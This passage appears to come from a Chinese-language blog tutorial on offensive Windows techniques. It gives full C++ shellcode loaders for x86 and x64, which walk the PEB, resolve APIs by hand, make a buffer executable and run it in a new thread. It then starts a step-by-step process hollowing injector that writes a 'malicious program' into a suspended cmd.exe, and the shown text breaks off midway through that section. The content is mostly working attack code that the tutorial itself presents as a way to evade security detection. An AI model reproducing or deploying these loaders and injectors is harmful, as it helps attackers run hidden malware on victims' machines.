<h2 id="x86代码实现"><a href="#x86代码实现" class="headerlink" title="x86代码实现"></a>x86代码实现</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//声明定义api函数</span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">FARPROC</span><span class="params">(WINAPI* p_GetProcAddress)</span><span class="params">(_In_ HMODULE hModule, _In_ LPCSTR lpProcName)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">HMODULE</span><span class="params">(WINAPI* p_LoadLibraryA)</span><span class="params">(__in LPCSTR lpLibFileName)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">BOOL</span><span class="params">(WINAPI* p_VirtualProtect)</span><span class="params">(LPVOID, DWORD, DWORD, PDWORD)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">HANDLE</span><span class="params">(WINAPI* p_CreateThread)</span><span class="params">(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">DWORD</span><span class="params">(WINAPI* p_WaitForSingleObject)</span><span class="params">(HANDLE, DWORD)</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 内联汇编函数，用于获取Kernel32.dll模块的基地址</span></span><br><span class="line">HMODULE <span class="keyword">inline</span> __declspec(naked) <span class="built_in">GetKernel32Moudle</span>()</span><br><span class="line">&#123;</span><br><span class="line">    __asm</span><br><span class="line">    &#123;</span><br><span class="line">        mov eax, fs: [<span class="number">0x30</span>] ;</span><br><span class="line">        mov eax, [eax + <span class="number">0xc</span>];</span><br><span class="line">        mov eax, [eax + <span class="number">0x14</span>]</span><br><span class="line">            mov eax, [eax];</span><br><span class="line">        mov eax, [eax];</span><br><span class="line">        mov eax, [eax + <span class="number">0x10</span>];</span><br><span class="line">        ret;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取GetProcAddress函数的地址</span></span><br><span class="line"><span class="function">DWORD <span class="title">pGetProcAddress</span><span class="params">(HMODULE Kernel32Base)</span> </span>&#123;</span><br><span class="line">    <span class="type">char</span> szGetProcAddr[] = &#123; <span class="string">&#x27;G&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;t&#x27;</span>,<span class="string">&#x27;P&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;s&#x27;</span>,<span class="number">0</span> &#125;;</span><br><span class="line">    DWORD result = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 遍历kernel32.dll的导出表，找到GetProcAddr函数地址</span></span><br><span class="line">    PIMAGE_DOS_HEADER pDosHead = (PIMAGE_DOS_HEADER)Kernel32Base;</span><br><span class="line">    PIMAGE_NT_HEADERS pNtHead = (PIMAGE_NT_HEADERS)((DWORD)Kernel32Base + pDosHead-&gt;e_lfanew);</span><br><span class="line">    PIMAGE_OPTIONAL_HEADER pOptHead = (PIMAGE_OPTIONAL_HEADER)&amp;pNtHead-&gt;OptionalHeader;</span><br><span class="line">    PIMAGE_EXPORT_DIRECTORY pExport = (PIMAGE_EXPORT_DIRECTORY)((DWORD)Kernel32Base + pOptHead-&gt;DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);</span><br><span class="line">    DWORD* pAddOfFun_Raw = (DWORD*)((DWORD)Kernel32Base + pExport-&gt;AddressOfFunctions);</span><br><span class="line">    WORD* pAddOfOrd_Raw = (WORD*)((DWORD)Kernel32Base + pExport-&gt;AddressOfNameOrdinals);</span><br><span class="line">    DWORD* pAddOfNames_Raw = (DWORD*)((DWORD)Kernel32Base + pExport-&gt;AddressOfNames);</span><br><span class="line">    <span class="type">char</span>* pFinded = <span class="literal">NULL</span>, * pSrc = szGetProcAddr;</span><br><span class="line">    <span class="keyword">for</span> (DWORD dwCnt = <span class="number">0</span>; dwCnt &lt; pExport-&gt;NumberOfNames; dwCnt++)</span><br><span class="line">    &#123;</span><br><span class="line">        pFinded = (<span class="type">char</span>*)((DWORD)Kernel32Base + pAddOfNames_Raw[dwCnt]);</span><br><span class="line">        <span class="keyword">while</span> (*pFinded &amp;&amp; *pFinded == *pSrc)</span><br><span class="line">        &#123;</span><br><span class="line">            pFinded++; pSrc++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (*pFinded == *pSrc)</span><br><span class="line">        &#123;</span><br><span class="line">            result = (DWORD)Kernel32Base + pAddOfFun_Raw[pAddOfOrd_Raw[dwCnt]];</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        pSrc = szGetProcAddr;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> buf[] = <span class="string">&quot;填写x86的shellcode&quot;</span>;</span><br><span class="line"></span><br><span class="line">    HMODULE hKernal32 = <span class="built_in">GetKernel32Moudle</span>(); <span class="comment">// 获取Kernel32模块的地址</span></span><br><span class="line">    p_GetProcAddress GetProcAddress = (p_GetProcAddress)<span class="built_in">pGetProcAddress</span>(hKernal32); <span class="comment">// 获取GetProcAddress函数的地址</span></span><br><span class="line">    p_VirtualProtect VirtualProtect = (p_VirtualProtect)<span class="built_in">GetProcAddress</span>(hKernal32, <span class="string">&quot;VirtualProtect&quot;</span>);  <span class="comment">//获取VirtualProtect函数地址</span></span><br><span class="line">    p_CreateThread CreateThread = (p_CreateThread)<span class="built_in">GetProcAddress</span>(hKernal32, <span class="string">&quot;CreateThread&quot;</span>);  <span class="comment">//获取CreateThread函数地址</span></span><br><span class="line">    p_WaitForSingleObject WaitForSingleObject = (p_WaitForSingleObject)<span class="built_in">GetProcAddress</span>(hKernal32, <span class="string">&quot;WaitForSingleObject&quot;</span>);  <span class="comment">//获取WaitForSingleObject函数地址</span></span><br><span class="line"></span><br><span class="line">    DWORD oldProtect;</span><br><span class="line">    <span class="built_in">VirtualProtect</span>((LPVOID)buf, <span class="built_in">sizeof</span>(buf), PAGE_EXECUTE_READWRITE, &amp;oldProtect);</span><br><span class="line"></span><br><span class="line">    HANDLE hThread = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)(LPVOID)buf, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">WaitForSingleObject</span>(hThread, INFINITE);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="x64代码实现"><a href="#x64代码实现" class="headerlink" title="x64代码实现"></a>x64代码实现</h2><p>由于x64无法编写内联汇编代码, 因此需另创一个asm文件来进行编写</p>
<img src="shellcode加载器/image-20230505164445694.png" alt="image-20230505164445694" style="zoom:67%;" />		



<p>此处我创建了一个<code>GetInitializationOrderModuleList.asm</code>, 用于获取<code>InitializationOrderModuleList</code>, 其代码如下所示:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.CODE</span><br><span class="line">    GetInInitializationOrderModuleList PROC</span><br><span class="line">    mov rax,gs:[60h] ; PEB，注意，这里不能写0x60</span><br><span class="line">    mov rax,[rax+18h] ; PEB_LDR_DATA</span><br><span class="line">    mov rax,[rax+30h] ; InInitializationOrderModuleList</span><br><span class="line">    ret ; 这里不能写retn</span><br><span class="line">    GetInInitializationOrderModuleList ENDP</span><br><span class="line">END</span><br></pre></td></tr></table></figure>



<p>随后鼠标右键单击新建的asm文件, 选择属性, 在常规选项处将<code>从生成中排除</code>设置为<code>否</code>, 项类型设置为<code>自定义生成工具</code></p>
<img src="shellcode加载器/image-20230505164722633.png" alt="image-20230505164722633" style="zoom:67%;" />	



<p>在自定义生成工具选项处, 在命令行框输入:<code>ml64 /Fo $(IntDir)%(fileName).obj /c %(fileName).asm</code>, 在输出框输入:<code>$(IntDir)%(FileName).obj</code></p>
<img src="shellcode加载器/image-20230505165453883.png" alt="image-20230505165453883" style="zoom:67%;" />	



<p>打开项目属性，勾选<code>C/C++-&gt;代码生成-&gt;禁用安全检查</code></p>
<img src="shellcode加载器/image-20230505171010208.png" alt="image-20230505171010208" style="zoom:67%;" />	



<p>以下是shellcode加载代码</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// UNICODE_STRING 结构体定义</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_UNICODE_STRING</span> &#123;</span><br><span class="line">    USHORT Length;  <span class="comment">//表示字符串中的字符数,由于它是unicode形式的字符,因此每个字符占两个字节</span></span><br><span class="line">    USHORT MaximumLength;  <span class="comment">//分配的内存空间的大小，以字节为单位</span></span><br><span class="line">    PWSTR Buffer;  <span class="comment">//表示指向存储Unicode字符串的字符数组的指针</span></span><br><span class="line">&#125; UNICODE_STRING, * PUNICODE_STRING;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 声明获取 InInitializationOrderModuleList 链表的函数</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> <span class="function">PVOID64 __stdcall <span class="title">GetInInitializationOrderModuleList</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取 Kernel32.dll 的基地址</span></span><br><span class="line"><span class="function">HMODULE <span class="title">getKernel32Address</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 获取 InInitializationOrderModuleList 链表</span></span><br><span class="line">    LIST_ENTRY* pNode = (LIST_ENTRY*)<span class="built_in">GetInInitializationOrderModuleList</span>();</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="comment">// 获取 FullDllName 成员</span></span><br><span class="line">        UNICODE_STRING* FullDllName = (UNICODE_STRING*)((BYTE*)pNode + <span class="number">0x38</span>);</span><br><span class="line">        <span class="comment">// 如果 Buffer 中的第 13 个字符为空字符，则已找到 Kernel32.dll</span></span><br><span class="line">        <span class="keyword">if</span> (*(FullDllName-&gt;Buffer + <span class="number">12</span>) == <span class="string">&#x27;\0&#x27;</span>) &#123;</span><br><span class="line">            <span class="comment">// 返回模块的基地址</span></span><br><span class="line">            <span class="keyword">return</span> (HMODULE)(*((ULONG64*)((BYTE*)pNode + <span class="number">0x10</span>)));</span><br><span class="line">        &#125;</span><br><span class="line">        pNode = pNode-&gt;Flink;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取 GetProcAddress 函数的地址</span></span><br><span class="line"><span class="function">DWORD64 <span class="title">getGetProcAddress</span><span class="params">(HMODULE hKernal32)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 获取 DOS 头</span></span><br><span class="line">    PIMAGE_DOS_HEADER baseAddr = (PIMAGE_DOS_HEADER)hKernal32;</span><br><span class="line">    <span class="comment">// 获取 NT 头</span></span><br><span class="line">    PIMAGE_NT_HEADERS pImageNt = (PIMAGE_NT_HEADERS)((LONG64)baseAddr + baseAddr-&gt;e_lfanew);</span><br><span class="line">    <span class="comment">// 获取导出表</span></span><br><span class="line">    PIMAGE_EXPORT_DIRECTORY exportDir = (PIMAGE_EXPORT_DIRECTORY)((LONG64)baseAddr + pImageNt-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);</span><br><span class="line">    <span class="comment">// 获取导出函数地址数组、导出函数名数组和导出函数序号数组</span></span><br><span class="line">    PULONG RVAFunctions = (PULONG)((LONG64)baseAddr + exportDir-&gt;AddressOfFunctions);</span><br><span class="line">    PULONG RVANames = (PULONG)((LONG64)baseAddr + exportDir-&gt;AddressOfNames);</span><br><span class="line">    PUSHORT AddressOfNameOrdinals = (PUSHORT)((LONG64)baseAddr + exportDir-&gt;AddressOfNameOrdinals);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 遍历导出函数</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; exportDir-&gt;NumberOfNames; i++) &#123;</span><br><span class="line">        <span class="comment">// 获取当前函数地址</span></span><br><span class="line">        LONG64 F_va_Tmp = (ULONG64)((LONG64)baseAddr + RVAFunctions[(USHORT)AddressOfNameOrdinals[i]]);</span><br><span class="line">        <span class="comment">// 获取当前函数名地址</span></span><br><span class="line">        PUCHAR FunctionName = (PUCHAR)((LONG64)baseAddr + RVANames[i]);</span><br><span class="line">        <span class="comment">// 如果当前函数名是 &quot;GetProcAddress&quot;，返回其地址</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">strcmp</span>((<span class="type">const</span> <span class="type">char</span>*)FunctionName, <span class="string">&quot;GetProcAddress&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> F_va_Tmp;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义函数指针类型</span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">FARPROC</span><span class="params">(WINAPI* pGetProcAddress)</span><span class="params">(HMODULE, LPCSTR)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">BOOL</span><span class="params">(WINAPI* pVirtualProtect)</span><span class="params">(LPVOID, DWORD, DWORD, PDWORD)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">HANDLE</span><span class="params">(WINAPI* pCreateThread)</span><span class="params">(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">DWORD</span><span class="params">(WINAPI* pWaitForSingleObject)</span><span class="params">(HANDLE, DWORD)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 定义包含 shellcode 的缓冲区</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> buf[] =</span><br><span class="line">        <span class="string">&quot;填写x64的shellcode&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取 Kernel32.dll 的基地址和GetProcAddress函数地址</span></span><br><span class="line">    HMODULE hKernal32 = <span class="built_in">getKernel32Address</span>(); <span class="comment">// 获取Kernel32.dll的基地址</span></span><br><span class="line">    pGetProcAddress GetProcAddress = (pGetProcAddress)<span class="built_in">getGetProcAddress</span>(hKernal32); <span class="comment">// 获取GetProcAddress函数地址</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//获取其他所需API函数地址</span></span><br><span class="line">    pVirtualProtect VirtualProtect = (pVirtualProtect)<span class="built_in">GetProcAddress</span>(hKernal32, <span class="string">&quot;VirtualProtect&quot;</span>);</span><br><span class="line">    pCreateThread CreateThread = (pCreateThread)<span class="built_in">GetProcAddress</span>(hKernal32, <span class="string">&quot;CreateThread&quot;</span>);</span><br><span class="line">    pWaitForSingleObject WaitForSingleObject = (pWaitForSingleObject)<span class="built_in">GetProcAddress</span>(hKernal32, <span class="string">&quot;WaitForSingleObject&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//修改shellcode缓冲区的内存保护属性，以便执行</span></span><br><span class="line">    DWORD oldProtect;</span><br><span class="line">    <span class="built_in">VirtualProtect</span>((LPVOID)buf, <span class="built_in">sizeof</span>(buf), PAGE_EXECUTE_READWRITE, &amp;oldProtect);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//创建新线程执行shellcode并等待其执行完成</span></span><br><span class="line">    HANDLE hThread = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)(LPVOID)buf, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">WaitForSingleObject</span>(hThread, INFINITE);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="15-进程镂空注入"><a href="#15-进程镂空注入" class="headerlink" title="15.进程镂空注入"></a>15.进程镂空注入</h1><h2 id="简介-2"><a href="#简介-2" class="headerlink" title="简介"></a>简介</h2><p>进程镂空（Process Hollowing），又称为“傀儡进程”，是一种恶意软件（malware）利用的代码注入技术。它主要用于将恶意代码注入到合法进程中，以规避安全检测、提高恶意代码执行的隐蔽性和稳定性</p>
<h2 id="实现思路-2"><a href="#实现思路-2" class="headerlink" title="实现思路"></a>实现思路</h2><h3 id="1-创建挂起进程"><a href="#1-创建挂起进程" class="headerlink" title="1.创建挂起进程"></a>1.创建挂起进程</h3><p>创建一个新的目标进程（这里是cmd.exe），并将其创建为挂起状态，这样它的主线程不会立即执行</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">BOOL bRet = <span class="built_in">CreateProcessA</span>(</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    (LPSTR)<span class="string">&quot;cmd&quot;</span>,</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    FALSE,</span><br><span class="line">    CREATE_SUSPENDED,</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    &amp;si,</span><br><span class="line">    &amp;pi);</span><br></pre></td></tr></table></figure>



<h3 id="2-读取恶意程序的内容"><a href="#2-读取恶意程序的内容" class="headerlink" title="2.读取恶意程序的内容"></a>2.读取恶意程序的内容</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//读取恶意程序的内容至本进程内存中</span></span><br><span class="line">hFile = <span class="built_in">CreateFileA</span>(path, GENERIC_READ, FILE_SHARE_READ, <span class="literal">NULL</span>, OPEN_EXISTING, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">dwFileSize = <span class="built_in">GetFileSize</span>(hFile, <span class="literal">NULL</span>); <span class="comment">//获取替换可执行文件的大小</span></span><br><span class="line">FileImage = <span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>, dwFileSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);</span><br><span class="line"><span class="built_in">ReadFile</span>(hFile, FileImage, dwFileSize, &amp;FileReadSize, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hFile);</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取恶意程序的文件头信息(Dos头和Nt头)</span></span><br><span class="line">pDosHeaders = (PIMAGE_DOS_HEADER)FileImage;  <span class="comment">//获取Dos头</span></span><br><span class="line">pNtHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)FileImage + pDosHeaders-&gt;e_lfanew); <span class="comment">//获取NT头</span></span><br></pre></td></tr></table></figure>



<h3 id="3-获取挂起进程的线程上下文和映像基址"><a href="#3-获取挂起进程的线程上下文和映像基址" class="headerlink" title="3.获取挂起进程的线程上下文和映像基址"></a>3.获取挂起进程的线程上下文和映像基址</h3><p>在挂起创建的进程中，<code>EBX</code>（在x86架构下）和<code>RDX</code>（在x64架构下）寄存器通常用于存储指向<code>PEB</code>（进程环境块）的指针。<code>PEB</code>是一个包含进程相关信息的数据结构，例如映像基地址、操作系统版本等。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取挂起进程的上下文</span></span><br><span class="line"><span class="built_in">GetThreadContext</span>(pi.hThread, &amp;ctx); </span><br><span class="line">  </span><br><span class="line"><span class="comment">//获取可执行</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _WIN64</span></span><br><span class="line">    <span class="built_in">ReadProcessMemory</span>(pi.hProcess, (PVOID)(ctx.Rdx + (<span class="built_in">sizeof</span>(SIZE_T) * <span class="number">2</span>)), &amp;RemoteImageBase, <span class="built_in">sizeof</span>(PVOID), <span class="literal">NULL</span>);</span><br><span class="line">    <span class="comment">// 从rbx寄存器中获取PEB地址，并从PEB中读取可执行映像的基址</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="comment">// 从ebx寄存器中获取PEB地址，并从PEB中读取可执行映像的基址</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _X86_</span></span><br><span class="line">    <span class="built_in">ReadProcessMemory</span>(pi.hProcess, (PVOID)(ctx.Ebx + <span class="number">8</span>), &amp;RemoteImageBase, <span class="built_in">sizeof</span>(PVOID), <span class="literal">NULL</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>



<h3 id="4-卸载挂起进程的内存"><a href="#4-卸载挂起进程的内存" class="headerlink" title="4.卸载挂起进程的内存"></a>4.卸载挂起进程的内存</h3><p>如果挂起进程的映像基址和恶意程序的映像基址相同，则调用NtUnmapViewOfSection卸载原始进程映像</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//判断文件预期加载地址是否被占用</span></span><br><span class="line">pNtUnmapViewOfSection NtUnmapViewOfSection = (pNtUnmapViewOfSection)<span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandleA</span>(<span class="string">&quot;ntdll.dll&quot;</span>), <span class="string">&quot;NtUnmapViewOfSection&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> ((SIZE_T)RemoteImageBase == pNtHeaders-&gt;OptionalHeader.ImageBase)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">NtUnmapViewOfSection</span>(pi.hProcess, RemoteImageBase); <span class="comment">//卸载已存在文件</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="5-将恶意程序内容写入目标进程"><a href="#5-将恶意程序内容写入目标进程" class="headerlink" title="5.将恶意程序内容写入目标进程"></a>5.将恶意程序内容写入目标进程</h3><p>先将恶意程序的头部信息写入目标进程，随后逐节将恶意程序的各个节写入</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//为可执行映像分配内存,并写入文件头</span></span><br><span class="line">RemoteProcessMemory = <span class="built_in">VirtualAllocEx</span>(pi.hProcess, (PVOID)pNtHeaders-&gt;OptionalHeader.ImageBase, pNtHeaders-&gt;OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line"><span class="built_in">WriteProcessMemory</span>(pi.hProcess, RemoteProcessMemory, FileImage, pNtHeaders-&gt;OptionalHeader.SizeOfHeaders, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//逐段写入</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; pNtHeaders-&gt;FileHeader.NumberOfSections; i++)</span><br><span class="line">&#123;</span><br><span class="line">pSectionHeaders = (PIMAGE_SECTION_HEADER)((LPBYTE)FileImage + pDosHeaders-&gt;e_lfanew + <span class="built_in">sizeof</span>(IMAGE_NT_HEADERS) + (i * <span class="built_in">sizeof</span>(IMAGE_SECTION_HEADER)));</span><br><span class="line"><span class="built_in">WriteProcessMemory</span>(pi.hProcess, (PVOID)((LPBYTE)RemoteProcessMemory + pSectionHeaders-&gt;VirtualAddress), (PVOID)((LPBYTE)FileImage + pSectionHeaders-&gt;PointerToRawData), pSectionHeaders-&gt;SizeOfRawData, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



